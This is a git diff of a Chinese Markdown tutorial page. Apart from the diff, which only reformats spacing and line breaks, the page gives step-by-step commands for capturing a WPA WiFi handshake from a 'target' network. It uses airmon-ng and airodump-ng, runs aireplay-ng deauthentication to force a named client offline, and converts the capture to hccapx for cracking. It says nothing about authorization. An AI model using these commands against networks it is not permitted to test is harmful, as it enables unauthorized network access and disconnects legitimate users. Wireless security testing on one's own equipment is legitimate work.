@@ -30,20 +30,22 @@ categories:
 
 ## 步骤
 
-0. 将网卡连接到VMware中
-1.`ifconfig -a`看有没有wlan0（即无线网卡）
-2.`airmon-ng start wlan0`启动监听服务
+0.将网卡连接到VMware中
+1. `ifconfig -a`看有没有wlan0（即无线网卡）
+2. `airmon-ng start wlan0`启动监听服务
 
-3.`ifconfig -a`看当前无线网卡名称是wlan0还是wlan0mon(有些网卡会在这时候变成wlan0mon，如果变了那么下面的wlan0就写wlan0mon)
-4.`airodump-ng wlan0/wlan0mon` 扫描wifi，记录目标的BSSID和CH(信道) ![image](../public/image-20250404191250-b5e8thw.png)
+3. `ifconfig -a`看当前无线网卡名称是wlan0还是wlan0mon(有些网卡会在这时候变成wlan0mon，如果变了那么下面的wlan0就写wlan0mon)
+4. `airodump-ng wlan0/wlan0mon` 扫描wifi，记录目标的BSSID和CH(信道)
+    ![image](../public/image-20250404191250-b5e8thw.png)
 5. `airodump-ng -w 保存握手包的文件名 -c 信道(CH) --bssid D6:93:51:05:7A:5C wlan0/wlan0mon`
+
     例如:`airodump-ng -w test -c 1 --bssid D6:93:51:05:7A:5C wlan0`
 
     记录下面两个数据，第一个是路由器地址(和上一步的一样)，第二个是客户端地址
-
     ![image](../public/image-20250404192722-gwvrdvz.png)
 
-    Tips:按<Space>暂停/继续,后方便复制
+    Tips:按Space暂停/继续,后方便复制
+
 6. 新开一个终端，上面那个不要暂停
 
     `aireplay-ng -0 2 -a D6:93:51:05:7A:5C -c CC:5E:F8:01:5E:0F wlan0/wlan0mon`
@@ -52,7 +54,6 @@ categories:
 
     可以多攻击几次，让目标设备重连网络，获取握手包
 7. 看之前的终端，出现handshake则成功
-
     ![image](../public/image-20250404193110-umugp3h.png)
 8. 转换成`hccapx`格式
 
